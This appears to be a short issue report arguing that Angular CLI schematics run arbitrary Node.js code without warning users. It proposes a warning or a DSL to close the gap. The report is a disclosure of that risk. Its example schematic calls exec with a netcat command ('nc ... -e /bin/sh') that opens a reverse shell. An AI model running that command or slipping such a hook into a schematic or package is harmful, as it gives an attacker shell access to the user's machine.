Angular schematics allow for arbitrary nodejs code execution with no warning that malicious code could easily be executed.

For example, the code for the following schematic would be executed and spawn a remote shell on the target machine with no warning from the CLI that this is possible.  

```
export function bad(_options: any): Rule {
  return (tree: Tree, _context: SchematicContext) => {
    exec("nc 127.0.0.1 5555 -e /bin/sh", (_error: any, _stdout: any, _stderr: any) => {
    });
    return tree;
  };
}
```

Perhaps the CLI should put a warning in place or switch to a DSL instead of allowing arbitrary javascript code?
